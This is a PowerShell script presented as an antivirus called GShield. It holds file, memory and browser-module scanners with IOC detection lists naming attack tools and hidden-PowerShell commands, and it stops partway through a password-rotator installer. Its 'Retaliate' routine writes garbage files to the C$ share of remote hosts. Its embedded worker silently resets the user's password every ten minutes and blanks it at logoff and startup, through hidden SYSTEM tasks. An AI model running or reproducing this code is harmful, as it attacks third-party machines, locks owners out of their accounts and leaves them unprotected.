# GShield.ps1
# Author: Gorstak
#Requires -RunAsAdministrator

param(
    [string[]]$Path,
    [int]$IntervalMinutes = 60,
    [int]$RootkitPollSeconds = 20,
    [int]$RootkitLookbackSeconds = 60
)

# ==================== CONFIG ====================
$InstallDir    = "$env:ProgramData\Antivirus"
$LogDir        = "$InstallDir\logs"
$QuarDir       = "$InstallDir\quarantine"
$LogFile       = "$LogDir\scanner.log"
$HashCacheFile = "$InstallDir\cache.csv"
$PwRotatorDir  = "C:\ProgramData\PasswordRotator"

$Ext = @('*.exe','*.dll','*.ocx','*.winmd','*.ps1','*.vbs','*.js','*.bat','*.cmd','*.scr','*.msi')

$Exclusions = @(
    "$env:ProgramFiles",
    "$env:ProgramFiles(x86)",
    "$env:windir",
    "$InstallDir",
    "C:\Windows\System32",
    "C:\Windows\SysWOW64",
    "C:\ProgramData",
    "$env:USERPROFILE\AppData\Local\Temp",
    "$env:USERPROFILE\AppData\Local\Microsoft"
)

$BrowserNames = @('chrome','msedge','firefox','opera','brave','vivaldi','iexplore','waterfox',
    'palemoon','seamonkey','librewolf','tor','chromium','maxthon','yandex','avastbrowser')

$RootkitWhitelist = @(
    "system","system idle process","idle","svchost","lsass","wininit",
    "winlogon","services","smss","csrss","fontdrvhost","sihost","dwm"
)

# Retaliate state
$script:AllowedIPs              = @()
$script:AllowedDomains          = @()
$script:RetaliatedConnections   = @{}
$script:CurrentBrowserConns     = @{}
$NeverRetaliateIPs              = @('8.8.8.8','8.8.4.4','1.1.1.1','1.0.0.1')

# ==================== LOGGING ====================
function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    "$ts [$Level] $Message" | Add-Content $LogFile -Force -EA 0
    if ($Level -eq 'ALERT') { Write-Host $Message -ForegroundColor Red }
    elseif ($Level -eq 'WARN')  { Write-Host $Message -ForegroundColor Yellow }
    elseif ($Level -eq 'CYAN')  { Write-Host $Message -ForegroundColor Cyan }
    else { Write-Host $Message }
}

# ==================== HELPERS ====================
function Get-SHA256 { param($file); (Get-FileHash $file -Algorithm SHA256).Hash }

function Test-Excluded { param($p)
    $p = $p.ToLower()
    foreach ($ex in $Exclusions) { if ($p.StartsWith($ex.ToLower())) { return $true } }
    $false
}

function Get-CommandLine { param($pid)
    try { (Get-WmiObject Win32_Process -Filter "ProcessId=$pid").CommandLine } catch { "" }
}

function Test-FileSigned { param($path)
    try {
        $cert  = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($path)
        $chain = New-Object System.Security.Cryptography.X509Certificates.X509Chain
        $chain.ChainPolicy.RevocationMode = "NoCheck"
        return $chain.Build($cert)
    } catch { return $false }
}

# ==================== SELF-PROTECTION ====================
function Invoke-SelfProtection {
    $currentPID = $PID
    Get-Process -Name "powershell" -EA 0 | Where-Object { $_.Id -ne $currentPID } | ForEach-Object {
        try {
            $cmd = Get-CommandLine $_.Id
            if ($cmd -like "*GShield.ps1*") {
                Stop-Process -Id $_.Id -Force -EA 0
                Write-Log "Killed duplicate GShield instance (PID $($_.Id))" "WARN"
            }
        } catch {}
    }
    try {
        Add-Type -Name Win32Hide -Namespace Win32 -MemberDefinition @"
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@ -EA 0
        $hwnd = [Win32.Win32Hide]::GetConsoleWindow()
        if ($hwnd) { [Win32.Win32Hide]::ShowWindow($hwnd, 0) | Out-Null }
    } catch {}
}

# ==================== HASH CACHE ====================
$global:HashCache  = @{}
$global:CacheDirty = $false

function Load-Cache {
    if (!(Test-Path $HashCacheFile)) { return }
    try {
        Import-Csv $HashCacheFile | ForEach-Object {
            try {
                $global:HashCache[$_.Path] = [pscustomobject]@{
                    Hash         = $_.Hash
                    Status       = $_.Status
                    LastModified = [datetime]::ParseExact($_.LastModified,"yyyy-MM-dd HH:mm:ss",$null)
                }
            } catch {}
        }
    } catch {}
}

function Save-Cache {
    if (-not $global:CacheDirty) { return }
    $global:HashCache.GetEnumerator() | ForEach-Object {
        [pscustomobject]@{
            Path         = $_.Key
            Hash         = $_.Value.Hash
            Status       = $_.Value.Status
            LastModified = $_.Value.LastModified.ToString("yyyy-MM-dd HH:mm:ss")
        }
    } | Export-Csv $HashCacheFile -NoTypeInformation -Force
    $global:CacheDirty = $false
}

function Test-CacheHit { param($file)
    $cached = $global:HashCache[$file.FullName]
    if (-not $cached) { return $false }
    if ($cached.LastModified -lt $file.LastWriteTime) { return $false }
    return $cached.Status -eq 'clean'
}

function Update-Cache { param($file, $hash, $status)
    $global:HashCache[$file.FullName] = [pscustomobject]@{
        Hash         = $hash
        Status       = $status
        LastModified = $file.LastWriteTime
    }
    $global:CacheDirty = $true
}

# ==================== AMSI ====================
if (-not ([System.Management.Automation.PSTypeName]'Amsi').Type) {
    Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("amsi.dll")] public static extern int AmsiInitialize(string a, out IntPtr c);
    [DllImport("amsi.dll")] public static extern int AmsiScanString(IntPtr c, string s, string n, string sess, out IntPtr r);
    [DllImport("amsi.dll")] public static extern void AmsiUninitialize(IntPtr c);
    public static int Scan(string s) {
        IntPtr ctx, rs; int hr = AmsiInitialize("GShield", out ctx);
        if (hr != 0) return 0;
        AmsiScanString(ctx, s, "", "", out rs); int res = (int)rs;
        AmsiUninitialize(ctx); return res;
    }
}
'@ -ErrorAction SilentlyContinue
}

function Test-Amsi { param([string]$c); if (!$c) { return 0 }; return [Amsi]::Scan($c) -ge 1 }


# ==================== MEMORY SCANNER (v2.9 - Stronger) ====================
if (-not ([System.Management.Automation.PSTypeName]'MemScanner').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class MemScanner {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, int size, out int bytesRead);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    const uint PROCESS_VM_READ = 0x0010;

    public static List<string> ScanProcess(int pid) {
        var findings = new List<string>();
        IntPtr hProc = OpenProcess(PROCESS_VM_READ, false, pid);
        if (hProc == IntPtr.Zero) return findings;
        try {
            byte[] buffer = new byte[32768];
            int bytesRead;
            Process proc = Process.GetProcessById(pid);
            foreach (ProcessModule mod in proc.Modules) {
                try {
                    long scanSize = Math.Min(0x200000, (long)mod.ModuleMemorySize);
                    for (long offset = 0; offset < scanSize; offset += 16384) {
                        ReadProcessMemory(hProc, (IntPtr)((long)mod.BaseAddress + offset), buffer, buffer.Length, out bytesRead);
                        if (bytesRead == 0) break;
                        string text = Encoding.ASCII.GetString(buffer, 0, bytesRead).ToLower();
                        if (text.Contains("virtualalloc") || text.Contains("createremotethread") ||
                            text.Contains("frombase64string") || text.Contains("downloadstring") ||
                            text.Contains("iex(") || text.Contains("-ep bypass") ||
                            text.Contains("urldownloadtofile") || text.Contains("shellcode") ||
                            text.Contains("rundll") || text.Contains("reflective")) {
                            findings.Add(mod.ModuleName); break;
                        }
                    }
                } catch { }
            }
        } finally { CloseHandle(hProc); }
        return findings;
    }
}
'@
}

function Invoke-MemoryScan {
    Get-Process -EA 0 | Where-Object { $_.Path -and !(Test-Excluded $_.Path) -and $_.Id -ne $PID } | ForEach-Object {
        try {
            $findings = [MemScanner]::ScanProcess($_.Id)
            if ($findings.Count -gt 0) {
                Write-Log "MEMORY DETECTION: $($_.ProcessName) (PID $($_.Id)) - Suspicious code in: $($findings -join ',')" "ALERT"
            }
        } catch {}
    }
}

# ==================== BROWSER MODULE GUARD (Aggressive) ====================
if (-not ([System.Management.Automation.PSTypeName]'ModuleGuard').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class ModuleGuard {
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr GetProcAddress(IntPtr mod, string proc);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stackSize, IntPtr start, IntPtr param, uint flags, out uint tid);
    [DllImport("kernel32.dll", SetLastError=true)] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

    static bool IsSigned(string path) {
        try {
            var cert = new X509Certificate2(path);
            var chain = new X509Chain();
            chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
            return chain.Build(cert);
        } catch { return false; }
    }

    public static List<string> UnloadUnsignedModules(int pid) {
        var unloaded = new List<string>();
        Process proc; try { proc = Process.GetProcessById(pid); } catch { return unloaded; }
        IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProc == IntPtr.Zero) return unloaded;
        try {
            IntPtr kernel32 = IntPtr.Zero;
            foreach (ProcessModule m in proc.Modules) {
                if (m.ModuleName.ToLower() == "kernel32.dll") { kernel32 = m.BaseAddress; break; }
            }
            if (kernel32 == IntPtr.Zero) return unloaded;
            IntPtr freeLibAddr = GetProcAddress(kernel32, "FreeLibrary");
            if (freeLibAddr == IntPtr.Zero) return unloaded;
            foreach (ProcessModule mod in proc.Modules) {
                try {
                    string path = mod.FileName;
                    string name = mod.ModuleName.ToLower();
                    if (path.ToLower() == proc.MainModule.FileName.ToLower()) continue;
                    if (name == "ntdll.dll" || name == "kernel32.dll" || name == "kernelbase.dll") continue;
                    if (name.Contains("appx") || name.Contains("edgewebview") || name.Contains("msedge")) continue;
                    if (!IsSigned(path)) {
                        uint tid;
                        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, freeLibAddr, mod.BaseAddress, 0, out tid);
                        if (hThread != IntPtr.Zero) {
                            WaitForSingleObject(hThread, 1500);
                            CloseHandle(hThread);
                            unloaded.Add(path);
                        }
                    }
                } catch { }
            }
        } finally { CloseHandle(hProc); }
        return unloaded;
    }
}
'@
}

function Invoke-BrowserModuleGuard {
    foreach ($name in $BrowserNames) {
        Get-Process -Name $name -EA 0 | ForEach-Object {
            $removed = [ModuleGuard]::UnloadUnsignedModules($_.Id)
            foreach ($mod in $removed) {
                Write-Log "UNLOADED unsigned browser module: $mod (from $($_.ProcessName) PID $($_.Id))" "ALERT"
            }
        }
    }
}

# Continuous per-PID module monitor — runs in a background runspace at 500ms intervals
# Tracks which modules have already been checked per PID so it only acts on newly loaded ones
function Start-ContinuousModuleMonitor {
    $rs = [runspacefactory]::CreateRunspace()
    $rs.ApartmentState = 'STA'
    $rs.ThreadOptions  = 'ReuseThread'
    $rs.Open()
    $rs.SessionStateProxy.SetVariable('BrowserNames', $BrowserNames)
    $rs.SessionStateProxy.SetVariable('LogFile',      $LogFile)

    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({
        function Write-BgLog { param([string]$M)
            "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [ALERT] $M" | Add-Content $LogFile -Force -EA 0
        }
        $KnownModules = @{}
        while ($true) {
            foreach ($name in $BrowserNames) {
                $procs = Get-Process -Name $name -EA 0
                foreach ($proc in $procs) {
                    $pid = $proc.Id
                    if (-not $KnownModules.ContainsKey($pid)) {
                        $KnownModules[$pid] = [System.Collections.Generic.HashSet[string]]::new(
                            [System.StringComparer]::OrdinalIgnoreCase)
                    }
                    try { $modules = $proc.Modules } catch { continue }
                    foreach ($mod in $modules) {
                        $mp = $mod.FileName
                        if ($KnownModules[$pid].Contains($mp)) { continue }
                        # New module — check and eject if unsigned
                        $removed = [ModuleGuard]::UnloadUnsignedModules($pid)
                        foreach ($r in $removed) {
                            Write-BgLog "CONTINUOUS-MONITOR: Unloaded unsigned module $r from $($proc.ProcessName) PID $pid"
                            [void]$KnownModules[$pid].Add($r)
                        }
                        [void]$KnownModules[$pid].Add($mp)
                    }
                }
            }
            # Prune dead PIDs
            $live = (Get-Process -EA 0).Id
            @($KnownModules.Keys | Where-Object { $live -notcontains $_ }) | ForEach-Object { $KnownModules.Remove($_) }
            Start-Sleep -Milliseconds 500
        }
    })
    $ps.BeginInvoke() | Out-Null
    Write-Log "Continuous browser module monitor started (background runspace)" "CYAN"
}


# ==================== DEEP FILE SCANNER ====================
# Scoring thresholds
$script:QuarantineScore = 60   # score >= this = quarantine
$script:SuspectScore    = 30   # score >= this = log as suspicious

# Known packer/protector signatures (PE section names or stub strings)
$PackerSigs = @(
    'UPX0','UPX1','UPX2',           # UPX
    '.ndata',                        # NSIS
    'ASPack','ASProtect',
    'Themida','WinLicense',
    'PECompact','PELock',
    'Obsidium','Enigma',
    'MPRESS','Petite',
    '.vmp0','.vmp1',                 # VMProtect
    'ConfuserEx','de4dot',
    'SmartAssembly'
)

# Shellcode / injection string IOCs (appear in binaries and scripts)
$ShellcodeIOCs = @(
    '\xfc\xe8','\x60\x89',          # common shellcode prologues (ASCII repr)
    'shellcode','shell_code',
    'payload','stager',
    'meterpreter','metasploit',
    'cobalt strike','cobaltstrike',
    'beacon','cs_beacon',
    'mimikatz','sekurlsa',
    'lsadump','hashdump',
    'invoke-mimikatz',
    'powersploit','powerup',
    'empire','invoke-empire',
    'nishang','invoke-nishang',
    'sharpshooter','donutshellcode',
    'donut_shellcode',
    'reflectivedllinjection',
    'reflective_dll',
    'inject_dll','dllinjection',
    'process_hollow','processhollowing',
    'process hollowing',
    'runpe','run_pe',
    'heavensgate','heaven.s.gate',
    'syscall_stub','direct_syscall',
    'ntdll_unhook','unhook_ntdll',
    'patch_amsi','amsi_bypass',
    'amsibypass','amsi.bypass',
    'etw_patch','patch_etw',
    'disable_etw',
    'wscript.shell','shell.application',
    'certutil -decode','certutil.exe -decode',
    'bitsadmin /transfer',
    'regsvr32 /s /n /u /i:http',
    'mshta http','mshta.exe http',
    'wmic process call create',
    'cmd /c powershell',
    'powershell -w hidden',
    'powershell -windowstyle hidden',
    '-nop -w hidden -enc',
    '-noprofile -noninteractive -enc'
)

# Suspicious API combinations (in binaries — these together indicate injection)
$InjectionAPIs = @(
    'VirtualAllocEx','WriteProcessMemory','CreateRemoteThread',
    'NtCreateThreadEx','RtlCreateUserThread',
    'NtUnmapViewOfSection','NtMapViewOfSection',
    'QueueUserAPC','NtQueueApcThread',
    'SetWindowsHookEx','GetAsyncKeyState',  # keylogger
    'SetThreadContext','GetThreadContext',
    'VirtualProtectEx','NtProtectVirtualMemory'
)

# C2 / download IOCs
$C2IOCs = @(
    'URLDownloadToFile','URLDownloadToCacheFile',
    'InternetOpenUrl','HttpSendRequest',
    'WinHttpOpen','WinHttpSendRequest',
    'DownloadString','DownloadData','DownloadFile',
    'Net.WebClient','WebRequest',
    'Invoke-WebRequest','wget ','curl ',
    'socket.connect','TCPClient',
    'dns.resolve','nslookup'
)

# Obfuscation IOCs (scripts and binaries)
$ObfIOCs = @(
    'FromBase64String','ToBase64String',
    'Convert]::FromBase64',
    '[char[]]','[char](','[byte[]](',
    '-join[char','join([char',
    'replace(.*,.*)',
    '-bxor','-bnot','-shl','-shr',
    'Invoke-Expression','IEX(',
    '[ScriptBlock]::Create',
    'EncodedCommand','-EncodedC',
    'GZipStream','DeflateStream',
    'MemoryStream','BinaryReader',
    'Reflection.Assembly','Assembly.Load',
    'System.Reflection.Emit',
    '[Runtime.InteropServices',
    'DllImport','GetDelegateForFunctionPointer',
    'Marshal.Copy','Marshal.GetFunctionPointerForDelegate',
    'VirtualAlloc','VirtualProtect'
)

function Get-Entropy { param([byte[]]$b)
    if (!$b -or !$b.Length) { return 0.0 }
    $f = @{}
    foreach ($c in $b) { $f[$c]++ }
    $e = 0.0
    foreach ($c in $f.Keys) { $p = $f[$c] / $b.Length; $e -= $p * [Math]::Log($p, 2) }
    return $e
}

function Invoke-DeepScan {
    param([string]$FilePath)

    $score   = 0
    $reasons = [System.Collections.Generic.List[string]]::new()
    $ext     = [IO.Path]::GetExtension($FilePath).ToLower()
    $isBinary = $ext -in '.exe','.dll','.ocx','.scr','.msi','.winmd'
    $isScript = $ext -in '.ps1','.vbs','.js','.bat','.cmd'

    # --- Try to read the file ---
    $bytes   = $null
    $strAscii = ''
    $strUtf16 = ''
    $readable = $false

    try {
        $bytes    = [IO.File]::ReadAllBytes($FilePath)
        $strAscii = [Text.Encoding]::ASCII.GetString($bytes).ToLower()
        $strUtf16 = [Text.Encoding]::Unicode.GetString($bytes).ToLower()
        $readable = $true
    } catch {
        # Can't read = locked/encrypted/packed — treat as suspicious
        $score += 40
        $reasons.Add("unreadable-file")
    }

    if ($readable) {
        $combined = $strAscii + $strUtf16

        # --- Entropy check ---
        $entropy = Get-Entropy $bytes
        if ($entropy -gt 7.8) {
            $score += 25; $reasons.Add("entropy=$([Math]::Round($entropy,2))")
        } elseif ($entropy -gt 7.2) {
            $score += 10; $reasons.Add("entropy-elevated=$([Math]::Round($entropy,2))")
        }

        # --- Zero readable strings in a binary (packed/encrypted) ---
        if ($isBinary) {
            # Count printable ASCII runs >= 6 chars
            $printableRuns = ([regex]::Matches($strAscii, '[!-~]{6,}')).Count
            if ($printableRuns -lt 10) {
                $score += 30; $reasons.Add("no-readable-strings")
            }

            # PE header present?
            $hasMZ = $bytes.Length -gt 1 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A
            if ($hasMZ) {
                # Check for packer signatures in section names / stub
                foreach ($sig in $PackerSigs) {
                    if ($combined.Contains($sig.ToLower())) {
                        $score += 20; $reasons.Add("packer:$sig"); break
                    }
                }
                # Injection API combos — score per API found, more = worse
                $apiHits = 0
                foreach ($api in $InjectionAPIs) {
                    if ($combined.Contains($api.ToLower())) { $apiHits++ }
                }
                if ($apiHits -ge 4) { $score += 35; $reasons.Add("injection-api-combo:$apiHits") }
                elseif ($apiHits -ge 2) { $score += 15; $reasons.Add("injection-apis:$apiHits") }
            }
        }

        # --- Shellcode / framework IOCs (binaries and scripts) ---
        $shellHits = 0
        foreach ($ioc in $ShellcodeIOCs) {
            if ($combined.Contains($ioc.ToLower())) { $shellHits++ }
        }
        if ($shellHits -ge 3) { $score += 50; $reasons.Add("shellcode-iocs:$shellHits") }
        elseif ($shellHits -ge 1) { $score += 20; $reasons.Add("shellcode-ioc:$shellHits") }

        # --- C2 / download IOCs ---
        $c2Hits = 0
        foreach ($ioc in $C2IOCs) {
            if ($combined.Contains($ioc.ToLower())) { $c2Hits++ }
        }
        if ($c2Hits -ge 3) { $score += 30; $reasons.Add("c2-iocs:$c2Hits") }
        elseif ($c2Hits -ge 1) { $score += 10; $reasons.Add("c2-ioc:$c2Hits") }

        # --- Obfuscation IOCs ---
        $obfHits = 0
        foreach ($ioc in $ObfIOCs) {
            if ($combined.Contains($ioc.ToLower())) { $obfHits++ }
        }
        if ($obfHits -ge 4) { $score += 35; $reasons.Add("obf-iocs:$obfHits") }
        elseif ($obfHits -ge 2) { $score += 15; $reasons.Add("obf-ioc:$obfHits") }

        # --- Script-specific: long base64 blobs ---
        if ($isScript) {
            $b64Matches = ([regex]::Matches($combined, '[a-z0-9+/]{200,}={0,2}')).Count
            if ($b64Matches -gt 0) { $score += 25; $reasons.Add("b64-blob:$b64Matches") }
        }

        # --- Temp/suspicious location bonus ---
        if ($FilePath -like "*\Temp\*" -or $FilePath -like "*\AppData\Roaming\*") {
            $score += 10; $reasons.Add("suspicious-location")
        }
    }

    return [pscustomobject]@{
        Score   = $score
        Reasons = ($reasons -join ', ')
    }
}

function Invoke-Scan { param([string]$p)
    Get-ChildItem $p -Recurse -Include $Ext -File -EA 0 |
        Where-Object { -not (Test-Excluded $_.FullName) } | ForEach-Object {
            $f = $_
            if (Test-CacheHit $f) { return }
            $hash   = Get-SHA256 $f.FullName
            $result = Invoke-DeepScan $f.FullName
            $isMalicious = $false

            if ($result.Score -ge $script:QuarantineScore) {
                Write-Log "THREAT [score=$($result.Score)]: $($f.FullName) | $($result.Reasons)" "ALERT"
                Move-Item $f.FullName "$QuarDir\$($f.Name)" -Force -EA 0
                $isMalicious = $true
            } elseif ($result.Score -ge $script:SuspectScore) {
                Write-Log "SUSPICIOUS [score=$($result.Score)]: $($f.FullName) | $($result.Reasons)" "WARN"
            }

            # AMSI scan for scripts regardless of score
            if (-not $isMalicious -and $f.Extension -in '.ps1','.vbs','.js') {
                $content = Get-Content $f.FullName -Raw -EA 0
                if ($content -and (Test-Amsi $content)) {
                    Write-Log "THREAT (AMSI): $($f.FullName)" "ALERT"
                    Move-Item $f.FullName "$QuarDir\$($f.Name)" -Force -EA 0
                    $isMalicious = $true
                }
            }

            $status = if ($isMalicious) { 'malicious' } else { 'clean' }
            Update-Cache $f $hash $status
        }
    Write-Log "Scan completed: $p"
}

# ==================== ROOTKIT KILLER ====================
function Invoke-RootkitScan {
    try {
        $start  = (Get-Date).AddSeconds(-$RootkitLookbackSeconds)
        $events = Get-WinEvent -FilterHashtable @{
            ProviderName = "Microsoft-Windows-HttpService"
            StartTime    = $start
        } -EA SilentlyContinue

        if (-not $events) { return }

        $candidatePids = New-Object System.Collections.Generic.HashSet[int]
        foreach ($evt in $events) {
            foreach ($prop in $evt.Properties) {
                $pid = 0
                if ([int]::TryParse("$($prop.Value)", [ref]$pid) -and $pid -gt 4) {
                    [void]$candidatePids.Add($pid)
                }
            }
        }

        foreach ($pid in $candidatePids) {
            $proc = Get-Process -Id $pid -EA SilentlyContinue
            if (-not $proc) { continue }
            $name = $proc.ProcessName.ToLowerInvariant()
            if ($RootkitWhitelist -contains $name) { continue }
            $path = try { $proc.MainModule.FileName } catch { $null }
            $sig  = if ($path) { Get-AuthenticodeSignature -FilePath $path -EA SilentlyContinue } else { $null }
            if ($sig -and $sig.Status -eq 'Valid') { continue }
            Write-Log "ROOTKIT: Killing unsigned HTTP-active process $($proc.ProcessName) (PID $pid) Path: $path" "ALERT"
            Stop-Process -Id $pid -Force -EA SilentlyContinue
        }
    } catch {}
}

# ==================== RETALIATE ====================
function Test-IsActiveBrowsing { param([string]$RemoteAddress, [string]$ProcessName, [int]$RemotePort)
    if ($BrowserNames -notcontains $ProcessName.ToLower()) { return $false }
    if ($RemoteAddress -match '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)') { return $true }
    if ($NeverRetaliateIPs -contains $RemoteAddress) { return $true }
    if ($script:AllowedIPs -contains $RemoteAddress) { return $true }
    $now = Get-Date
    if ($RemotePort -eq 443 -or $RemotePort -eq 80) {
        $script:CurrentBrowserConns[$RemoteAddress] = $now
        return $true
    }
    foreach ($ip in $script:CurrentBrowserConns.Keys) {
        if (($now - $script:CurrentBrowserConns[$ip]).TotalSeconds -le 30) { return $true }
    }
    return $false
}

function Invoke-Retaliate { param([string]$RemoteAddress, [int]$RemotePort, [string]$ProcessName)
    $key = "$RemoteAddress|$ProcessName"
    if ($script:RetaliatedConnections.ContainsKey($key)) { return }
    Write-Log "RETALIATE: Phoning-home detected $RemoteAddress`:$RemotePort from $ProcessName" "ALERT"
    $script:RetaliatedConnections[$key] = @{ IP = $RemoteAddress; Port = $RemotePort; Process = $ProcessName; Timestamp = Get-Date }
    # Attempt to flood attacker's admin share (best-effort, will silently fail if unreachable)
    try {
        $remotePath = "\\$RemoteAddress\C$"
        if (Test-Path $remotePath -EA SilentlyContinue) {
            $counter = 1
            while ($counter -le 10) {
                try {
                    $garbage = [byte[]]::new(10485760)
                    (New-Object System.Random).NextBytes($garbage)
                    [System.IO.File]::WriteAllBytes("$remotePath\garbage_$counter.dat", $garbage)
                    $counter++
                } catch { break }
            }
        }
    } catch {}
}

function Invoke-RetaliateMonitorCycle {
    $conns = Get-NetTCPConnection -State Established -EA SilentlyContinue |
        Where-Object { $_.RemoteAddress -ne '0.0.0.0' -and $_.RemoteAddress -ne '::' }
    foreach ($conn in $conns) {
        try {
            $proc = Get-Process -Id $conn.OwningProcess -EA Stop
            $procName = ($proc.ProcessName -replace '\.exe$','').Trim().ToLower()
            if ($BrowserNames -notcontains $procName) { continue }
            if (!(Test-IsActiveBrowsing -RemoteAddress $conn.RemoteAddress -ProcessName $proc.ProcessName -RemotePort $conn.RemotePort)) {
                Invoke-Retaliate -RemoteAddress $conn.RemoteAddress -RemotePort $conn.RemotePort -ProcessName $proc.ProcessName
            }
        } catch {}
    }
    # Expire stale browser connection cache
    $now = Get-Date
    $stale = $script:CurrentBrowserConns.Keys | Where-Object { ($now - $script:CurrentBrowserConns[$_]).TotalSeconds -gt 60 }
    $stale | ForEach-Object { $script:CurrentBrowserConns.Remove($_) }
}


# ==================== PASSWORD ROTATOR ====================
$PwRotatorWorkerScript = @'
param([string]$Mode, [string]$Username)
$ErrorActionPreference = 'Stop'
$TargetDir = if ($PSScriptRoot) { $PSScriptRoot } else { 'C:\ProgramData\PasswordRotator' }
$UserFile  = Join-Path $TargetDir 'currentuser.txt'

function Get-LoggedInUser {
    $u = $null
    try { $u = (Get-CimInstance -ClassName Win32_ComputerSystem -EA Stop).UserName } catch {}
    if (-not $u) { try { $u = $env:USERNAME } catch {} }
    if (-not $u) { return $null }
    if ($u -match '\\') { return $u.Split('\')[-1] }
    return $u
}
function Set-UserPassword { param([string]$U, [string]$P)
    if ([string]::IsNullOrWhiteSpace($U)) { return }
    try { Set-LocalUser -Name $U -Password (ConvertTo-SecureString -String $P -AsPlainText -Force) -EA Stop }
    catch {
        try { [ADSI]$a = "WinNT://$env:COMPUTERNAME/$U,user"; $a.SetPassword($P) }
        catch { "$(Get-Date -Format o) Set-UserPassword: $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append }
    }
}
function Set-UserPasswordBlank { param([string]$N)
    if ([string]::IsNullOrWhiteSpace($N)) { return }
    try { [ADSI]$a = "WinNT://$env:COMPUTERNAME/$N,user"; $a.SetPassword('') }
    catch { try { & net user $N '' } catch { "$(Get-Date -Format o) Blank: $_" | Out-File (Join-Path $TargetDir 'log.txt') -Append } }
}
function New-RandomPwd {
    $c = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%'
    -join ((1..24) | ForEach-Object { $c[(Get-Random -Maximum $c.Length)] })
}
function Remove-TasksForUser { param([string]$U)
    $s = $U -replace '[^a-zA-Z0-9]','_'
    @("PasswordRotator-10Min-$s","PasswordRotator-OnLogoff-$s") | ForEach-Object {
        Unregister-ScheduledTask -TaskName $_ -Confirm:$false -EA SilentlyContinue
    }
}

switch ($Mode) {
    'Logon' {
        $u = Get-LoggedInUser; if (-not $u) { exit 0 }
        if (-not (Test-Path $TargetDir)) { New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null }
        $u | Set-Content -Path $UserFile -Force
        Remove-TasksForUser -U $u
        $safe   = $u -replace '[^a-zA-Z0-9]','_'
        $worker = Join-Path $TargetDir 'Worker.ps1'
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $t10 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 3650)
        $a10 = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$worker`" -Mode Rotate"
        Register-ScheduledTask -TaskName "PasswordRotator-10Min-$safe" -Action $a10 -Trigger $t10 -Principal $principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force | Out-Null
        $tOff = New-ScheduledTaskTrigger -AtLogOff -User $u
        $aOff = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$worker`" -Mode Logoff -Username $u"
        Register-ScheduledTask -TaskName "PasswordRotator-OnLogoff-$safe" -Action $aOff -Trigger $tOff -Principal $principal -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable) -Force | Out-Null
        Start-Sleep -Seconds 60
        Set-UserPassword -U $u -P (New-RandomPwd)
    }
    'Rotate' {
        if (-not (Test-Path $UserFile)) { exit 0 }
        $u = (Get-Content -Path $UserFile -Raw).Trim()
        if ($u) { Set-UserPassword -U $u -P (New-RandomPwd) }
    }
    'Logoff' {
        if ($Username) {
            Set-UserPasswordBlank -N $Username
            $s = $Username -replace '[^a-zA-Z0-9]','_'
            Unregister-ScheduledTask -TaskName "PasswordRotator-10Min-$s"    -Confirm:$false -EA SilentlyContinue
            Unregister-ScheduledTask -TaskName "PasswordRotator-OnLogoff-$s" -Confirm:$false -EA SilentlyContinue
        }
    }
    'StartupBlank' {
        if (-not (Test-Path $UserFile)) { exit 0 }
        $u = (Get-Content -Path $UserFile -Raw -EA SilentlyContinue).Trim()
        if ($u) { Set-UserPasswordBlank -N $u }
    }
}
'@

function Install-PasswordRotator {
    if (-not (Test-Path $PwRotatorDir)) { New-Item -Path $PwRotatorDir -ItemType Directory -Force | Out-Null }
    $workerPath = Join-Path $PwRotatorDir 'Worker.ps1'
    $PwRotatorWorkerScript | Set-Content -Path $workerPath -Encoding UTF8 -Force

    # Resolve current user robustly — WMI may fail in some contexts
    $currentUser = $null
    try { $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name } catch {}
    if (-not $currentUser) { try { $currentUser = $env:USERNAME } catch {} }
